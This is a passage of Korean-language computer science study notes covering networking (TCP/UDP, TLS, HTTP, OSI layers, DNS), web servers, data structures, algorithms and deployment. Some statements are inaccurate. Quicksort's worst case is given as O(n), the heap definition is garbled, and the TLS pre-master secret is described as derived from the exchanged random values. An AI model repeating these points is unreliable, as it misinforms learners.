  3. UDP : 데이터를 데이터그램 단위로 처리하는 프로토콜이다. 여기서 데이터그램이란 독립적인 관계를 지니는 패킷이라는 뜻이다. TCP와 달리 UDP는 비연결 지향적 프로토콜이다. 비연결 지향적이란 데이터를 주고받을 때 연결 절차를 거치지 않고 발신자가 일방적으로 데이터를 발신하는 방식을 의미한다.

- TCP/IP, UDP 차이

  |                | TCP                  | UDP                    |
  | -------------- | -------------------- | ---------------------- |
  | 연결 방식      | 연결 지향적 프로토콜 | 비연결 지향적 프로토콜 |
  | 패킷 교환 방식 | 가상 회선 방식       | 데이터그램 방식        |
  | 전송 순서      | 보장                 | 비보장                 |
  | 수신 여부 확인 | 확인                 | 확인하지 않음          |
  | 통신 방식      | 1:1 통신             | 1:1, 1:N, N:N 통신     |
  | 신뢰성         | 높다                 | 낮다                   |
  | 속도           | 느리다               | 빠르다                 |

- SSL(Secure Sockets Layer), TLS(Transport Layer Security)

  SSL/TLS는 인터넷 통신 중 데이터(패킷)를 암호화하여 도청, 위변조를 방지하는 보안 프로토콜이다. SSL/TLS를 사용하는 웹사이트는 URL에서 HTTP 대신 HTTPS를 사용하며, 브라우저는 서버의 인증서(SSL 인증서)를 검증해 신뢰할 수 있는 사이트인지를 판단한다. 현재는 TLS가 표준이며, "SSL 인증서"라는 표현은 관습적으로 사용되는 명칭일 뿐 실제로는 TLS 기반 인증서이다.

  -> 내가 이해한 내용으로는 간단히 TLS 프로토콜을 사용하면 HTTP 메서드를 사용한 요청/응답 시 요청 본문, URL 파라미터, 응답 데이터 등 모든 내용이 평문이 아니라 암호화되어 탈취 시 안전하다고 이해했다.

- SSL/TLS 통신 과정 (참고: https://wayhome25.github.io/cs/2018/03/11/ssl-https/)

  1. 클라이언트에서 서버로 클라이언트 랜덤 데이터 (랜덤 바이트)와 지원하는 암호화 방식 목록(Cipher Suites)을 전송

  2. 서버에서 클라이언트로 서버 랜덤 데이터, 선택된 암호화 방식, SSL 인증서(공개키 포함) 전송

  3. 서버 인증서의 유효성 검증 (신뢰할 수 있는 CA인지 확인) 후 클라이언트 랜덤 + 서버 랜덤을 기반으로 Pre-Master Secret(임시 대칭키 재료)을 생성, 이 Pre-Master Secret을 서버의 공개키로 암호화하여 서버로 전송

  4. 서버는 자신의 비밀키(Private Key)로 받은 데이터를 복호화하여 같은 Pre-Master Secret을 획득

  5. 클라이언트와 서버는 동일한 Pre-Master Secret과 랜덤 데이터를 기반으로 대칭키를 생성, 이후에는 이 대칭키로 암호화된 데이터를 주고받음 (→ 빠르고 효율적인 암호화/복호화가 가능)

  6. 통신 종료(세션 종료) 시 생성된 대칭키는 폐기되어 보안성을 유지

- HTTP와 HTTPS의 차이

  HTTP 프로토콜은 컴퓨터 네트워크에서 데이터를 주고 받을 때 사용하는 통신 프로토콜이다. HTTPS는 HTTP 프로토콜에 데이터 암호화가 추가된 프로토콜이다.
  공개키/개인키 방식을 활용해 데이터를 암호화한다. HTTPS는 암호화가 추가되어 안전하게 데이터를 주고 받을 수 있다. 단점은 SSL/TLS 인증서를 발급하고 유지하는데 추가 비용이 발생할 수 있다.

- HTTP 버전별 차이 (참고: https://withbundo.blogspot.com/2021/02/http-http-10-http-11.html)

  (1) HTTP/0.9 : GET 메서드만 지원, HTTP 헤더 없음, HTML만 전송 가능

  (2) HTTP/1.0 : 메서드, 헤더 추가(HTML 이외 다른 파일 전송 가능), 한 커넥션 당 한개의 요청, 요청과 응답이 이루어진 후 다음 요청 가능

  (3) HTTP/1.1 : 동시에 여러 개(최대 6개, 완벽한 병렬은 아님, 직렬 응답)의 요청과 각각의 응답을 받을 수 있는 파이프라이닝 추가, 버츄얼 호스팅(하나의 IP에 여러 도메인)을 가능하게 하는 호스트 헤더 추가, Keep-Alive 기본 지원으로 한 커넥션 당 여러 개의 요청을 할 수 있는 커넥션 유지 기능 추가, 가장 널리 쓰임

  (4) HTTP/2 : 멀티플렉싱 지원(한 커넥션에서 여러 요청과 응답이 동시에 병렬 처리 가능), 헤더 압축으로 데이터 양 감소, 서버 푸시, 성능 개선 등

  (5) HTTP/3 : TCP 대신 UDP 기반의 QUIC 프로토콜 사용, 멀티플렉싱과 오류 복원 향상, TLS 암호화 기본 탑재, 2022년 IETF 표준 채택, 0-RTT 연결 지원 및 핸드쉐이크 지연 시간 단축, 점진적 도입 중

- HTTP 상태 코드 의미

  1. 200번대 : 성공 (Successful), 대부분 통신 성공을 의미

  - 200 : 요청이 성공적으로 처리되어 응답이 정상적으로 돌아온 경우

  - 201 : 요청이 성공적으로 처리되었고, 서버가 새로운 리소스를 생성했을 때

  - 202 : 요청을 받아들였지만 아직 처리 중인 상태 (비동기 작업 등)

  - 204 : 요청은 성공했으나 응답할 데이터가 없는 경우

  2. 300번대 : 리다이렉션 (Redirection), 대부분 클라이언트가 이전 주소로 데이터를 요청하여 서버에서 새 URL로 리다이렉트를 유도하는 경우이다.

  - 300 : 요청한 리소스에 대해 여러 선택지가 있어 클라이언트가 선택해야 하는 경우

  - 301 : 요청한 리소스가 영구적으로 다른 URL로 이동했음을 알림 (검색엔진 최적화에 중요)

  3. 400번대 : 클라이언트 오류 (Client Error), 유효하지 않은 자원을 요청했거나 요청이나 권한이 잘못된 경우 발생

  - 400 : 요청 구문 잘못된 경우의 에러

  - 401 : 인증 에러

  - 403 : 권한이 없어서 접근을 거부할 때

  - 404 : 자원 에러, 빈 페이지 접근

  4. 500번대 : 서버 오류 (Server Error)

  - 500 : 서버 내부에서 알 수 없는 오류가 발생했을 때

<br>

### # 인공지능, 머신러닝, 딥러닝

- 인공지능

  인공지능이란 인간이 가지고 있는 지적 능력을 컴퓨터에서 구현하는 다양한 기술이나 소프트웨어, 컴퓨터 시스템 등을 말한다.

- 머신러닝

  컴퓨터가 스스로 학습할 수 있도록 도와주는 알고리즘이나 기술을 개발하는 분야, 머신러닝에서는 컴퓨터가 학습을 통해 새로운 규칙을 생성할 것을 기대한다.

- 딥러닝

  머신러닝 모델의 한 종류로 인공신경망을 여러 개 연결하여 인간의 뇌와 유사한 정보 입출력 계층을 만듦으로써 데이터를 학습하게 하는 기술이다.

- 개념 : 인공지능 > 머신러닝 > 딥러닝

<br>

### # 인터넷의 발전

1. 컴퓨터 <-> 컴퓨터

   인터넷의 가장 기본적인 것은, 컴퓨터들이 서로 통신 가능한 거대한 네트워크라는 것이다. 케이블 또는 무선으로 연결을 지속한다.

2. 컴퓨터 <-> 라우터 <-> 컴퓨터

   여러 대의 컴퓨터가 연결될 때 많은 플러그와 케이블이 필요하게 되는데 이런 문제를 해결하기 위해 라우터가 연결된다. 중간에 라우터가 위치하여 컴퓨터와 라우터 혹은 컴퓨터 사이에서 통신을 전달한다. 라우터 끼리의 연결도 가능하다.

3. 컴퓨터 <-> 라우터 <-> 모뎀 <-> 라우터 <-> 컴퓨터

   먼 곳에 있는 컴퓨터와 연결하기 위해 네트워크를 전화 시설과 연결하게 된다. 이 때 모뎀이라는 장비를 활용하여 네트워크의 정보를 전화 시설에서 처리할 수 있는 정보로 바꾸어 어느 곳에 있는 라우터와 통신이 가능하도록 한다.

4. 컴퓨터 <-> 라우터 <-> 모뎀 <-> ISP1 <-> ... <-> ISP2 <-> 모뎀 <-> 라우터 <-> 컴퓨터

   모뎀을 통해 전화시설에 연결 후 ISP(인터넷 서비스 제공 업체)를 통해 도달해야 할 컴퓨터 혹은 네트워크까지 도달하게 한다. ISP는 네트워크 연결을 담당하며 다른 ISP와 통신할 수 있도록 한다.

<br>

### # VPN

- VPN(Virtual Private Network)

  가상 사설망이라고 하며 두 대 이상의 장치 간의 암호화 된 보안 터널이다.

- VPN 사용 이유

  1. 대체 IP 사용 : 대체 IP 주소를 사용하기 때문에 위치 추적이 불가능하다.

  2. 데이터 암호화 : 모든 데이터를 암호화한다. 데이터 암호화를 통해 ISP가 사용자 데이터를 판매하는 것을 방지할 수 있고 개방형 와이파이를 안전하게 사용할 수 있다.

  3. 추가적인 보안 : 악성 웹사이트, 애드, 트래커를 차단한다.

  4. 지역별 차단 우회 : IP를 사용한 지역별 차단을 우회하여 거주자 전용 컨텐츠 등을 확인할 수 있다.

<br>

### # URI, URL, URN

- URI

  리소스(자원)를 식별하기 위한 통합 개념, URL과 URN을 포함하는 개념이다.

- URL

  URI의 하위 개념으로, 리소스의 위치(Location)를 명시 (예시: https://example.com/path)

- URN

  URI의 하위 개념으로, 리소스의 이름(Name)을 식별하지만, 위치 정보는 없음 (예시: urn:isbn:9783161484100)

- URI, URL 구성

  | 부분                             | 명칭                 | 설명                                                                      |
  | -------------------------------- | -------------------- | ------------------------------------------------------------------------- |
  | file://, http://, https://       | scheme(protocol)     | 자원에 접근하는 방법 또는 통신 방식 (http, https, ftp, mailto 등)         |
  | 127.0.0.1, www.google.com        | hosts                | 리소스를 호스팅하는 서버의 도메인 이름 또는 IP 주소                       |
  | :80, :443, :3000                 | port                 | (선택 사항) 서버의 특정 서비스로 연결되는 포트 번호. 기본은 80, 443       |
  | /search, /Users/username/Desktop | path                 | 서버의 특정 자원에 대한 경로. 디렉토리 구조 기반                          |
  | ?q=JavaScript&page=1             | Query (Query String) | (선택 사항) 서버에 전달할 데이터. key=value 형식, &로 구분                |
  | #section2                        | Fragment             | (선택 사항) 문서 내 특정 위치(앵커)로 이동할 때 사용 (HTML의 id와 매칭됨) |

<br>

### # 폴링, 롱폴링, 소켓 통신, 웹소켓, Server-Sent Event

- 폴링(Polling)

  리얼타입 웹을 위한 기법, 브라우저가 일정한 주기로 HTTP 요청을 보내는 방식이다. 보통 실시간 데이터의 업데이트 주기는 예측하기 어려우므로 변경 사항이 없어도 계속 요청하므로 불필요한 트래픽과 서버 부하 발생

- 롱폴링(Long-Polling)

  리얼타입 웹을 위한 기법, 클라이언트가 서버에 요청을 보내고 서버는 데이터가 준비될 때까지 대기 후 응답. 응답이 오면 클라이언트는 즉시 새로운 요청을 보내 지속적으로 데이터를 받음. 여전히 요청-응답 반복 구조라 지연/부하 가능성 존재

- 웹소켓

  HTTP 프로토콜은 비연결지향 프로토콜로 요청과 응답이 완료된 후 커넥션 연결을 끊어버리는 특징이 있지만 웹소캣의 경우 커넥션을 유지하여 언제든 양방향 통신이 가능하도록 하는 기술이다.
  최초 연결은 HTTP 프로토콜을 통해 이루어지고 이후 웹소캣 연결이 완료되면 독자적인 프로토콜을 사용한다. 실시간 채팅과 같이 리얼타임 같은 기능에 사용된다.

- SSE(Server-Sent Event)

  웹소켓이 양방향 통신이라면 SSE는 단방향 통신(서버 -> 클라이언트)으로 클라이언트가 데이터를 받을 수만 있게 하는 통신 방법이다. 웹소켓과 달리 HTTP 프로토콜을 사용하며 주로 알림, 모니터링 데이터, 뉴스 피드 등에 적합 (양방향이 필요 없다면 웹소켓보다 효율적)

- 비교 요약

  | 항목           | 폴링        | 롱폴링      | 웹소켓           | SSE                        |
  | -------------- | ----------- | ----------- | ---------------- | -------------------------- |
  | 통신 방향      | 단방향      | 단방향      | **양방향**       | 단방향 (서버 → 클라이언트) |
  | 연결 방식      | 주기적 요청 | 요청 → 대기 | **지속적 연결**  | 지속적 연결                |
  | 서버 push 가능 | ❌          | ❌          | ✅               | ✅                         |
  | 기반 프로토콜  | HTTP        | HTTP        | HTTP → WebSocket | HTTP (text/event-stream)   |
  | 실시간성       | 낮음        | 중간        | **높음**         | 높음                       |
  | 브라우저 지원  | 전체        | 전체        | 대부분 지원      | 대부분 지원 (IE 미지원)    |
  | 구현 난이도    | 쉬움        | 중간        | 어려움           | 쉬움                       |

<br>

### # telnet, SSH, FTP, SFTP

- telnet : 원격 접속

  네트워크를 통해 원격 컴퓨터의 터미널(명령어 인터페이스)에 접속할 수 있는 프로토콜, 평문 (기본 23번 포트)

- SSH(Secure Shell) : 보안 원격 접속

  네트워크 상에서 원격 컴퓨터에 안전하게 접속하고 명령을 실행할 수 있게 해주는 프로토콜 (기본 22번 포트)

- FTP(File Transfer Protocol) : 파일 전송

  클라이언트와 서버 간에 파일을 전송하기 위한 표준 프로토콜, 평문 (제어 연결 기본 21번 포트, 데이터 전송 20번 (액티브 모드에서만 사용))

- SFTP(Secure File transfer protocol) : 보안 파일 전송

  SSH 연결을 기반으로 암호화된 파일 전송을 제공하는 프로토콜 (기본 포트 22번, SSH와 동일)

<br>

### # 공인 IP, 사설 IP

- 공인 IP

  인터넷 사용자의 로컬 네트워크(LAN)를 식별하기 위해 ISP(인터넷 서비스 공급자)가 제공하는 IP 주소이다. 공용 IP 주소라고도 불리며 외부에 공개되어 있는 IP 주소 (예 웹 서버, DNS 서버, 인터넷 공유기의 WAN 포트 등)

- 사설 IP

  로컬 IP, 가상 IP라고도 불리며 내부 네트워크(로컬망)에서만 사용되며 인터넷 상에서는 유효하지 않은 IP 주소 (예 공유기에 연결된 스마트폰, 컴퓨터, 프린터 등)

<br>

### # 포트 포워딩, 내부포트, 외부포트

- 포트(Port)

  포트는 하나의 컴퓨터(호스트) 내에서 실행 중인 애플리케이션(프로세스)을 식별하기 위한 논리적인 숫자이다. IP 주소가 어떤 컴퓨터로 데이터를 보낼지를 나타낸다면, 포트는 그 컴퓨터 안의 어떤 프로그램(서비스)에 보낼지를 결정한다.

- 포트 포워딩(Port-Forwarding)

  포트 포워딩은 외부 네트워크에서 들어오는 요청을 내부 네트워크의 특정 장치와 포트로 전달하는 기능이다. 보통 공유기나 라우터에서 설정하며, 외부에서 특정 서비스(예: 웹 서버, 게임 서버 등)에 접근할 수 있도록 할 때 사용된다.

- 내부포트

  라우터나 공유기가 실제 내부 장치로 전달할 때 사용하는 포트 번호

- 외부포트

  외부에서 접속할 때 사용하는 공인 IP 주소의 포트 번호

<br>

### # OSI 7계층

- OSI(Open Systems Interconnection Reference Model) 7계층

  OSI 7계층은 국제표준화기구(ISO)가 정의한 네트워크 통신의 추상화 모델이다. 통신 과정을 7단계로 나눔으로써 문제를 쉽게 구분하고, 역할을 명확히 하며, 프로토콜을 표준화할 수 있게 했다.

- 각 계층 설명 (하위 -> 상위)

  | 계층 번호 | 계층 이름 (한글/영문)            | 주요 기능                                                        | 대표 장비/프로토콜        |
  | --------- | -------------------------------- | ---------------------------------------------------------------- | ------------------------- |
  | 1계층     | **물리 계층** (Physical)         | 0과 1의 **비트 단위 데이터**를 물리적으로 전송                   | 케이블, 허브, 리피터      |
  | 2계층     | **데이터 링크 계층** (Data Link) | 프레임 단위 데이터 전송, **MAC 주소**, 에러 검출                 | 스위치, 브릿지, 이더넷    |
  | 3계층     | **네트워크 계층** (Network)      | **패킷 전송**, 논리적 주소(IP), 라우팅                           | 라우터, IP, ICMP          |
  | 4계층     | **전송 계층** (Transport)        | **프로세스 간 통신**, 포트 번호, 신뢰성 (TCP), 속도 (UDP)        | TCP, UDP                  |
  | 5계층     | **세션 계층** (Session)          | 연결 관리, 세션 생성/유지/종료                                   | API, 소켓, NetBIOS        |
  | 6계층     | **표현 계층** (Presentation)     | 데이터 형식 변환, 암호화, 압축, 인코딩/디코딩                    | JPEG, MPEG, SSL, ASCII    |
  | 7계층     | **응용 계층** (Application)      | 사용자와 가장 가까운 계층, 애플리케이션 네트워크 인터페이스 제공 | HTTP, FTP, DNS, SMTP, SSH |

<br>

### # 캡슐화, 역캡슐화

- 캡슐화와 역캡슐화

  컴퓨터의 웹 브라우저에 URL을 입력할 때부터 웹 서버에 데이터가 도착할 때까지 각 과정에서는 캡슐화와 역캡슐화가 이루어진다.

- 캡슐화

  송신 측(데이터를 보내는 쪽)에서 상위 계층의 데이터에 각 계층별 헤더(필요 시 트레일러 포함)를 덧붙여 하위 계층으로 전달하는 과정을 말한다. (상위에서 하위로 진행 응용 계층 -> 물리 계층)

  ex) 데이터 → TCP 헤더 추가 → IP 헤더 추가 → 이더넷 헤더 추가 → 전송

- 역캡슐화

  수신 측(데이터를 받는 쪽)에서는 수신된 데이터에서 각 계층이 붙인 헤더를 하나씩 제거하면서 원래의 데이터로 복원한다.

  ex) 수신 → 이더넷 헤더 제거 → IP 헤더 제거 → TCP 헤더 제거 → 원본 데이터

<br>

### # CPU 캐시기억장치의 캐시 (레지스터, 캐시기억장치, 주기억장치, 보조기억 장치 중 캐시기억장치)

- 캐시

  - 캐시(Cache)는 CPU와 주기억장치(RAM) 사이에 위치한 고속의 임시 기억장치로, 자주 사용하는 데이터를 미리 저장해 CPU가 빠르게 접근할 수 있도록 돕는다.

  - 레지스터 < 캐시 < 주기억장치(RAM) < 보조기억장치(HDD/SSD), 레지스터를 기준으로 속도는 가장 빠르고 용량은 매우 작고, 가격은 가장 비싸다. 우측으로 갈수록 속도가 느려지고 용량이 커지며 가격이 저렴해진다.

<br>

- 캐시의 지역성

  1. 시간적 지역성 : 최근에 접근한 데이터는 가까운 미래에 다시 접근할 가능성이 높다.

  2. 공간적 지역성 : 한 번 접근한 메모리 주소 근처의 주소도 곧 접근할 가능성이 높다.

<br>

- 캐시 동작 방식

  1. CPU가 데이터를 요청하면 우선 캐시에서 검색 (Cache Hit 여부 확인)

  2. 캐시에 없으면 (Cache Miss) → 주기억장치(RAM)에서 읽고, 캐시에 복사

  3. 캐시에 데이터가 있으면 바로 반환 → 처리 속도 향상

  4. 오래된 데이터는 **교체 알고리즘(LRU 등)**에 따라 제거됨

<br><br><br>

## # Web

<br>

### # 브라우저 동작 원리

- 브라우저란?

  브라우저란 웹 페이지, 이미지와 같은 콘텐츠를 수신하고 전송하고 표현하는 소프트웨어다. 대표적인 브라우저로 크롬, 사파리 등이 있다. 브라우저의 주요 기능은 사용자가 선택한 URI 주소의 자원을 서버에 요청하고 브라우저에 표시하는 것이다.

- 브라우저 기본 구조

  - 사용자 인터페이스

    주소 표시줄, 이전/다음 버튼, 북마크 메뉴 등, 요청한 페이지를 보여주는 창을 제외한 나머지 모든 부분

  - 브라우저 엔진

    사용자 인터페이스와 렌더링 엔진 사이의 동작을 제어

  - 렌더링 엔진

    요청한 콘텐츠를 표시, 예를 들어 HTML을 요청하면 HTML과 CSS를 파싱하여 화면에 표시함

  - 통신

    HTTP 요청과 같은 네트워크 호출에 사용, 이것은 플랫폼 독립적인 인터페이스이고 각 플랫폼 하부에서 실행

  - UI 백엔드

    select / input 등 기본적인 위젯을 그림. 플랫폼에서 명시하지 않은 일반적인 인터페이스로서, OS 사용자 인터페이스 체계를 사용

  - 자바스크립트 해석기

    자바스크립트 코드를 해석하고 실행

  - 자료 저장소

    Cookie, Local storage등 local에 data를 저장하는 저장소

- 브라우저의 동작 과정

  1. 사용자가 브라우저 주소표시줄에 검색하고자 하는 URL을 입력 -> 브라우저가 URL 파싱

  - 프로토콜(http/https), 도메인, 포트 등으로 나눔

  - 예: https://www.example.com:443 → 프로토콜(https), 도메인(www.example.com), 포트(443)

  2. DNS 서버에 요청하여 해당 URL을 IP 주소로 변환하여 응답

  - 검색 주소의 웹 서버 IP 주소를 찾기 위해 브라우저, OS, 라우트, ISP 캐시에 캐싱 된 DNS 기록을 우선적으로 확인하고 캐싱 된 기록이 없다면 IP 주소를 응답 받을 때 까지 루트, 탑 레벨, 세컨드 레벨, 써드 레벨 네임 서버까지 순차적으로 IP 주소를 요청한다.

  3. IP 주소를 받은 뒤, 패킷 라우팅

  - 사용자의 컴퓨터에서 해당 IP가 속한 네트워크로 가기 위한 라우터(게이트웨이)로 패킷 전송

  - 라우터는 최적 경로를 찾아 목적지 서버 네트워크로 패킷 전달

  4. IP 주소 → MAC 주소 변환 (같은 로컬 네트워크 내에서)

  - ARP 프로토콜 사용해 IP 주소에 해당하는 MAC 주소 확인

  - MAC 주소는 물리적 네트워크 인터페이스 고유 주소

  - (중간 라우터 통과 시, 각 네트워크 구간마다 ARP 동작)

  5. TCP 3-way 핸드셰이크를 통해 서버와 TCP 연결 수립

  - 클라이언트와 서버가 SYN, SYN-ACK, ACK 순서로 패킷 주고받으며 연결 확립

  6. TCP 연결 후 HTTP 요청 전송

  - HTTP/HTTPS 프로토콜로 원하는 리소스 요청 (예: HTML 문서)

  - 서버는 요청받은 리소스를 HTTP 응답으로 전송

  7. 브라우저가 받은 응답(HTML, CSS, JS, 이미지 등)을 파싱 및 렌더링

<br>

### # DNS

- DNS란 도메인 네임 시스템으로 도메인을 컴퓨터가 이해할 수 있는 IP 주소로 변환해주는 네임 서버 시스템이다. 사용자가 주소창에 도메인 주소를 입력하면 브라우저는 해당 도메인 주소를 가지고 있는
  네임 서버에 요청을 보내고 네임 서버는 해당 도메인 주소와 매핑되는 IP 주소를 찾은 후 응답해준다.

<br>

### # Web Server, WAS

- Web Server

  클라이언트(브라우저)로부터 HTTP 요청을 받아 정적 컨텐츠(HTML, CSS, 이미지 등)를 전달하는 서버이다. 동적 컨텐츠 요청은 Web Server가 WAS로 넘겨 처리한 후 결과를 다시 클라이언트에게
  전달한다. 대표적인 웹 서버로는 Apache, Nginx가 있다.

- WAS (Web Application Server)

  동적 컨텐츠 생성을 담당하는 서버로, 데이터베이스 조회, 비즈니스 로직 수행 등을 처리한다. HTTP 요청을 받아 JSP, Servlet 같은 애플리케이션 코드를 실행하고, 데이터베이스와 연동해 결과를 생성한다.
  흔히 서블릿 컨테이너 또는 웹 컨테이너라고 불린다. 대표적인 예로 Tomcat, JBoss, WebSphere 등이 있다

  -> 내가 이해한 내용으로는 서버 사이드 렌더링을 수행하는 서버가 될 수도 있고, API 요청을 처리하는 백엔드 서버가 될 수도 있다.

- WAS가 필요한 이유

  정적 컨텐츠만 처리하는 Web Server로는 동적 데이터 생성이 불가능하다. 모든 페이지를 미리 만들어놓는 것은 비효율적이고 자원 낭비이다. WAS는 클라이언트 요청에 따라 실시간으로 데이터베이스와 상호작용해 필요한 결과를 동적으로 생성하여 효율적인 서비스 제공이 가능하다.

<br><br><br>

## # Data Structure

<br>

### # 자료구조

- 자료구조

  자료구조란 데이터를 효율적으로 관리할 수 있는 데이터 구조를 의미한다. 자료의 저장 방식에 따라 선형 구조(Linear)와 비선형 구조(Non-Linear) 등으로 나뉜다.

  [자료구조](https://user-images.githubusercontent.com/85284246/178629531-dfac3453-33c7-4b5d-8317-5c4af5c1da2b.png)

- 분류별 자료구조

- 선형 구조 : 데이터가 일렬로 저장된다. 연결 리스트(Linked List),등

  1. Array(배열) : 기본적으로 고정 길이이며, 연속된 메모리 공간에 데이터를 저장한다. 인덱스를 이용해 데이터에 빠르게 접근할 수 있다.

  2. Stack(스택) : 스택은 늦게 넣은 데이터를 가장 먼저 꺼낼 수 있는 자료구조이다. 후입선출 방식이다.

  3. Queue(큐) : 큐란 가장 먼저 넣은 데이터를 가장 먼저 꺼낼 수 있는 자료구조이다. 선입선출 방식이다.

  4. Deque(데크) : 스택과 큐의 장점들을 모두 가지고 있는 방식으로 선입선출, 후입선출 모두 가능하다.

  5. Linked List(연결 리스트) : 각 노드는 데이터와 다음 노드에 대한 참조(포인터)를 가지고 있다. 일반적으로 링크드 리스트의 시작이 되는 노드는 헤드, 마지막 노드는 테일이라고 부른다.

- 비선형 구조 : 계층적 또는 네트워크 형태로 저장된다. 트리(Tree), 그래프(Graph) 등

  - Heap(힙) : 항상 최댓값(최소 힙의 경우 최소값) 또는 최솟값(최대 힙의 경우 최대값)을 빠르게 찾을 수 있도록 구성된 완전 이진 트리 기반의 자료구조로 반정렬 상태이다.

  - Graph(그래프) : 단순히 노드(정점)와 그 노드(정점)를 연결하는 간선(링크)을 하나로 모아 놓은 자료 구조이다. 루트가 없고 노드 간 부모 자식 관계가 없고 사이클이 존재할 수 있다. 간선 수도 제한이 없다.

  - Tree(트리) : Graph의 한 종류이다. 그래프와 차이점은 트리는 한 개의 루트 노드가 존재하고, 노드 간 부모 자식 관계를 가지고 있으며 사이클이 존재하지 않는 방향 그래프이다. 또 간선의 수는 노드 당 1개를 가지고 있고 계층 모델이다.

  - Binary Tree(이진트리) : 이진트리라고도 하며 모든 노드들이 최대 두 개의 자식 노드를 가진 트리 자료구조이다. 깊이 우선 탐색(DFS), 너비 우선 탐색(BFS) 같은 탐색 알고리즘과 밀접한 연관이 있다.

- 해시 기반 구조 (Hash-based Structure) : 키를 해시 함수로 변환해 빠르게 접근

  - Hash table : 해시 테이블은 키를 해시 함수에 넣어 해시 값을 얻고 해시 값을 index로 사용하여 값과 함꼐 저장하는 자료 구조이다. 키(key), 값(value)이 하나의 쌍을 이루는 데이터 구조이다.

- 특정 언어의 자료구조 비교

  | 자료구조 | 순서 유지  | 중복 허용        | Key-Value 구조 |
  | -------- | ---------- | ---------------- | -------------- |
  | List     | O          | O                | X              |
  | Set      | X          | X                | X              |
  | Map      | X (or O\*) | Key: X, Value: O | O              |

<br><br><br>

## # Algorithm

<br>

### # 알고리즘

- 알고리즘

  어떤 문제를 해결하기 위해 사용되는 풀이과정을 말한다. 즉, 문제 해결 방법을 말한다. 효율적인 알고리즘이란 수행을 시작하여 결과가 도출될 때까지 실행에 걸리는 시간이 짧고
  연산하는 컴퓨터 내의 메모리와 같은 자원을 덜 사용하는 것이 효율적이라고 할 수 있다.

- 시간 복잡도

  알고리즘을 수행에 필요한 시간을 나타낸다. 표기법으로 빅오엔, 빅세타, 빅오메가 등이 있으며 보통 최악의 수행 시간을 나타내는 빅오엔 표기법 O(n)을 활용한다.

- 공간 복잡도

  알고리즘 수행에 필요한 메모리 양을 나타낸다.

- Big-O 표기법

  알고리즘에 시간 복잡도와 공간 복잡도를 표기하는 데 사용한다.

- 정렬 알고리즘

  1. 선택소트 : 미정렬 부분의 데이터를 모두 탐색하여 가장 작은 값(혹은 큰)을 선택하고, 선택된 값과 미정렬 부분의 가장 첫 번째 데이터와 교환을 반복하는 알고리즘이다. 최선, 최악, 평균 O(n^2)

  2. 버블소트 : 한쪽 방향에서부터 시작하여 두 인접한 원소를 순차적으로 검사하며 두 원소의 자리를 바꾸어 정렬하는 알고리즘이다. 최선 O(n), 최악 O(n^2)

  3. 힙소트 : 최대 힙 트리나 최소 힙 트리를 구성해 정렬을 하는 알고리즘으로, 내림차순 정렬을 위해서는 최소 힙을 구성하고 오름차순 정렬을 위해서는 최대 힙을 구성하면 된다.

  4. 삽입소트 : 정렬이 완료되지 않은 데이터를 선택하여 이미 정렬이 완료된 앞(왼쪽)의 자료들과 비교하여 삽입할 위치를 지정한 후 자료를 뒤로 옮기고 지정한 자리에 자료를 삽입하여 정렬하는 알고리즘이다. 최선 O(n), 최악 O(n^2)

  5. 퀵소트 : 하나의 리스트를 선택한 요소(피벗)를 기준으로 두 개의 비균등한 크기로 분할하고 분할된 부분 리스트를 정렬한 다음, 두 개의 정렬된 부분 리스트를 합하여 전체가 정렬된 리스트가 되게 하는 알고리즘이다. 최선 O(nlogn), 최악 O(n)

  6. 머지소트 : 하나의 리스트를 두 개의 균등한 크기로 분할하고 분할된 부분 리스트를 정렬한 다음, 두 개의 정렬된 부분 리스트를 합하여 전체가 정렬된 리스트가 되게 하는 알고리즘이다. 최선, 최악, 평균 O(nlogn)

- 탐색 알고리즘

  1. 순차 탐색 알고리즘(Sequential Search) : 리스트의 처음부터 끝까지 차례대로 비교하면서 값을 찾는 탐색 알고리즘

  2. 이진 탐색 알고리즘(Binary Search) : 정렬된 리스트에서 임의의 중간 값을 기준으로 왼쪽 또는 오른쪽 절반을 반복 탐색하여 임의의 중간 값과 찾고자 하는 값의 크기를 비교하며 탐색하는 알고리즘

- 완전 탐색 알고리즘

  1. 재귀 알고리즘(Recursion) : 다른 말로는 재귀 함수라고 하며 자신을 다시 호출하여 작업을 수행하는 방식을 의미한다. 종료 조건이 꼭 포함되어야하며 반복문을 사용하는 코드는 항상 재귀 함수로 구현할 수 있다.

  2. 깊이 우선 탐색 DFS(Depth-First Search) : 루트 노드 혹은 다른 임의의 노드에서 시작해서 다음 분기로 넘어가기 전에 해당 분기를 완벽하게 탐색하는 알고리즘이다.

  3. 너비 우선 탐색 BFS(Breadth First Search) : 루트 노드 혹은 다른 임의의 노드에서 시작해서 분기와 관계없이 인접한 노드를 먼저 탐색하는 알고리즘이다.

  ![깊이우선탐색_너비우선탐색_비교](https://user-images.githubusercontent.com/85284246/178636275-17ac00fe-d3d3-4f81-991e-85ec041264f1.gif)

- 최단 경로 알고리즘

  1. 다익스트라 알고리즘(Dijkstra) : 가중치가 있는 그래프에서 한 정점으로부터 모든 정점까지의 최단 거리를 구하는 알고리즘.

- 분할 정복 알고리즘(Divide and Conquer)

  문제를 작은 문제로 분할하고, 각 문제를 해결한 후 합쳐서 전체 문제를 해결하는 알고리즘 설계 기법. 퀵소트, 머지소트 문제, 고속 푸리에 변환(FFT) 문제가 대표적인 분할 정복 알고리즘

- 동적 계획법(Dynamic Programming)

  작은 문제의 결과를 저장하고 재사용하여 전체 문제를 해결하는 방식. 중복되는 계산을 줄여 효율을 높임

- 탐욕 알고리즘(Greediness)

  각 단계에서 가장 최선의 선택을 하는 방식으로 전체 문제의 최적해를 구하려는 알고리즘

- 몬테 카를로 알고리즘(Monte Carlo)

  무작위 난수를 사용하여 확률적으로 정답에 근접하는 값을 추정하는 알고리즘.

<br>

### # 퍼지 문자열 검색

- 퍼지 문자열 검색은 정확하지 않은 입력에도 유사한 문자열을 찾아내는 검색 방법으로, 초성 검색 추천 기능도 퍼지 검색 알고리즘을 활용하는 대표적인 예이다

<br><br><br>

## # Infra

<br>

### # AWS

- 배포 자동화란?

  말 그대로 배포를 자동화하는 것이고 명령어 하나만으로 배포를 자동적으로 진행하는 것을 말한다. 배포 자동화를 통해 개발자는 개발에만 더욱 집중할 수 있어 개발자 경험이 향상되고
  주기적인 배포를 통해 최신 버전을 빠르게 사용자에게 제공할 수 있습니다. 배포 자동화에서 자주 쓰이는 방식으로 CI/CD(지속적 통합/지속적 배포) 방식이 있다. 예를 들어 예를 들어 Next.js 프로젝트를
  Vercel에 연결하면 레포지토리와 연동만으로 CI/CD가 자동 구축되어 매우 편리합니다.

